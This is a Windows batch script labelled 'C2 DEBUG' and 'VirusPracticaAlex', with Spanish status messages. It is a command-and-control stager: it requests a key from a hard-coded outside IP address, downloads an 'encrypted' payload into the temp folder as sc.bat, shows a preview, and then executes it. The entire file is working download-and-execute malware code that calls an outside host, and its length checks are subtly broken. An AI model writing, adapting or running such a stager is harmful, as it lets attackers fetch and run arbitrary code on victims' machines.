@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1
title C2 DEBUG - FIXED VERSION

echo.
echo ╔══════════════════════════════════════╗
echo ║     🔥 C2 DEBUG - FIXED 🔧           ║
echo ║        VirusPracticaAlex             ║
echo ╚══════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%temp%\sc.bat"

echo 📍 TEMP: %temp%
echo 🌐 BASE: %BASE%
echo.

REM ===== 1. TIMESTAMP - FIXED =====
echo 🔢 [1] Generando TS (MÉTODO 1: PowerShell)...
powershell -NoP -Command "Write-Output ([int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds())" > "%temp%\ts.txt"
set /p TS=<"%temp%\ts.txt"
del "%temp%\ts.txt"
echo    -> TS=%TS%
echo    -> LEN=%TS:~9%
echo.

REM ===== 2. KEY - FIXED =====
echo 🔑 [2] KEY Generation...
echo    -> URL: %BASE%/auth/key?ts=%TS%
curl -s "%BASE%/auth/key?ts=%TS%" > "%temp%\key.txt" 2>"%temp%\curl_key_err.txt"

set /p KEY=<"%temp%\key.txt"
if "!KEY!"=="" (
    echo    ❌ KEY VACÍA
    echo    📄 KEY FILE: %temp%\key.txt
    echo    📄 CURL ERR: %temp%\curl_key_err.txt
    pause
    exit /b 1
)

echo    -> KEY=!KEY:~0,44!
echo    -> LEN=!KEY:~43!
if "!KEY:~43!" NEQ "44" (
    echo    ❌ LEN inválida
    pause
    exit /b 1
)
echo    ✅ KEY OK ✓
echo.

REM ===== 3. PAYLOAD - FIXED =====
echo 📥 [3] Downloading...
echo    -> HEADER: X-Decrypt-Key: !KEY:~0,44!
curl -s ^
  -H "X-Decrypt-Key: !KEY:~0,44!" ^
  "%BASE%/payload/encrypted" ^
  -o "!FILE!" ^
  --max-time 10 ^
  > "%temp%\curl_payload.txt" 2>&1

if errorlevel 1 (
    echo    ❌ CURL ERROR
    type "%temp%\curl_payload.txt"
    pause
    exit /b 1
)

if not exist "!FILE!" (
    echo    ❌ FILE NO CREATED
    dir "%temp%\sc*"
    pause
    exit /b 1
)

for %%F in ("!FILE!") do set "SIZE=%%~zF"
echo    -> SIZE: %SIZE% bytes ✓
echo.

REM ===== 4. PREVIEW =====
echo 👁️ [4] PAYLOAD PREVIEW:
echo    ╔═══════
type "!FILE!" | more /e +1 /n 15
echo    ═══════╝
echo.

REM ===== 5. EXECUTE =====
echo ⚡ [5] EXECUTING...
echo    [ENTER] = Run  |  [Ctrl+C] = Abort
pause >nul

echo    -> call "!FILE!"
call "!FILE!"

echo ✅ [DONE]
pause